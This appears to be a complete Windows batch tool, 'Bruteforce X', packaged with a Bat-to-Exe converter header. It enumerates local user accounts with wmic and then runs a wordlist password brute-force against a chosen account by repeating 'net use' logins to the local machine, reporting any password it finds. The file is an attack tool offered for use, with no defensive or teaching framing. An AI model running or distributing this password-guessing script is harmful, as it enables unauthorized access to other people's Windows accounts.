::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBVXHVTaAE+1EbsQ5+n//NaDo1kca+syeYje5aSAJ7sR61bh93brmHNZl6s=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZks0
::ZQ05rAF9IBncCkqN+0xwdVsFAlTi
::ZQ05rAF9IAHYFVzEqQISOg5ASQKNLmi/Zg==
::eg0/rx1wNQPfEVWB+kM9LVsJDAaQKX+/ALoO6+216vKCwg==
::fBEirQZwNQPfEVWB+kM9LVsJDCqsE1j6JKcJ/O394PiEpy0=
::cRolqwZ3JBvQF1fEqQIRJltRTRebfHy7H/UI56j5/f+Tpw0bW/A8fc/OybGcYPAS+VbzeoQpxTpVlosbBRVccQW4IG8=
::dhA7uBVwLU+EWHeF4EoxJlt6SRCVM3mxSvU1xsub
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEphJifVt6TRCKPWX6KLAI/+fp5KbHi2M+NA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBVXHVTaAE+/Fb4I5/jH3/iIqEgeQPEDWp3OzrGIL/IQ73nmZ4M503xVisgJFFVdZhfL
::YB416Ek+Zm8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Bruteforce X - NNOS Apps
setlocal enabledelayedexpansion
chcp 65001 >nul
:start
cls
set "error=-"
color 02
set "user="
set "wordlist="
echo.
echo.     ___.                 __          _____
echo.     \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo.      ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \        
echo.      ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/  \/ 
echo.      ^|_____/__^|  ^|____/ ^|__^|  \_____^>__^|  \____/^|__^|    \_____^>_____^> /\  
echo.
echo.   SYNTAX:
echo.   1. Users
echo.   2. Run
echo.   3. Clear
echo.   4. Exit
echo.
:input
set /p "choice=BF>> "
if "%choice%"=="1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)
if "%choice%"=="2" (
  goto bruteforce
)
if "%choice%"=="3" (
  cls
  goto start
)
if "%choice%"=="4" (
  exit
)

:bruteforce
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p "user=BF_Query>> "
echo.
echo [PASSWORD LIST]
set /p "wordlist=BF_Query>> "
if not exist "%wordlist%" (
  echo.
  echo [%error%]: File not found
  pause >nul
  goto start
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [%error%]: User doesn't exist
  pause >nul
  goto start
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "delims=" %%a in (%wordlist%) do (
  set "pass=%%a"
  call :varset
)
echo.
echo [%error%]: Password not found
pause >nul
goto start

:success
echo.
echo Password found: %pass%
net use \\127.0.0.1 /d /y >nul 2>&1
set "user="
set "pass="
echo.
pause >nul
goto start

:varset
net use \\127.0.0.1 /user:%user% !pass! 2>&1 | find "System error 1331" >nul
if %errorlevel%==0 (
    echo Password found: !pass!
    goto success
)
echo [ATTEMPT !count!] [!pass!]
set /a count+=1
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success